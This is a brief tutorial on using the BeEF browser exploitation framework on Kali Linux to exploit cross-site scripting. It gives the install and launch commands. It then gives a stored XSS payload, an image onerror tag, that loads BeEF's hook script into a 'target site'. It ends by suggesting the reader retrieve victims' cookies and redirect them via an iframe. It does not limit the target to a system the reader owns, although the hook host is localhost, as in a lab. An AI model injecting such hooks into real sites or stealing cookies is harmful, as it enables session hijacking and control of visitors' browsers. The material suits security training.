# Example of using beef to explorer XSS

1. Install Kali Linux.

2. Install Beef.

```
sudo apt update
sudo apt install beef-xss
```

3. Run Beef.

```
cd /usr/share/beef-xss/
sudo ./beef
```

4. Copy hook script URL.

5. Open Beef UI in browser.

6. Open target site and inject beef hook script using Stored XSS Vector.

```
<img src=1 onerror=$.getScript("http://localhost:3000/hook.js")> Beef
```

7. Back to Beef UI, check online browser. Go to commands and test some of them, like retrieving cookies and redirect using iframe.
